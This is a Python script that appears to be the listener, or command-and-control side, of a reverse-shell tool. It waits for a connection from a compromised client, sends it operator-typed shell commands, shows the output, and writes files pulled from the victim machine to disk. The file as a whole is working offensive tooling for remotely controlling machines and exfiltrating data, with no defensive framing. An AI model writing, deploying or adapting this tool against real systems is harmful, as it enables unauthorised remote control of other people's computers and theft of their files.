import click
import socket

# colors
red = "\033[31m"
gray = "\033[90m"
reset = "\033[0m"
blue = "\033[34m"
green = "\033[32m"

# buffers
message_buffer = 99999
file_buffer = 999999999


@click.command()
@click.option("--host", prompt="[+] Set HOST", help="set host", type=str)
@click.option("--port", prompt="[+] Set PORT", help="set port", type=int)
def main(host, port):
    try:
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.bind((host, port))
        server.listen(1)
        print(f'{green}[*] Listening on {host}:{port}{reset}')
    except:
        print(f"{red}[!] Error occurred! Check your host and port address{reset}")
        main()
    
    try:
        client, address = server.accept()
        print(f"{green}[+] Connected with {address}{reset}\n")

        while True:
            command = click.prompt("Shell")
            client.send(command.encode())

            response = client.recv(message_buffer).decode()
            match response:
                case "<FILE>":
                    handle_file(client)
                case "<ERRO>":
                    print(f'{red}Error{reset}')
                case "<SCCS>":
                    print(f'{green}Success{reset}')
                case _:
                    print(f"{gray}Response: {response}{reset}")
    except:
        print(f"{red}[!] Client disconnected : {address}{reset}")

# function to handle file
def handle_file(client_socket):
    name = client_socket.recv(1024).decode()
    data = client_socket.recv(file_buffer)
    with open(name + "e", "wb") as file:
        file.write(data)
    print(f"{green}[+] Saved file as {name}{reset}")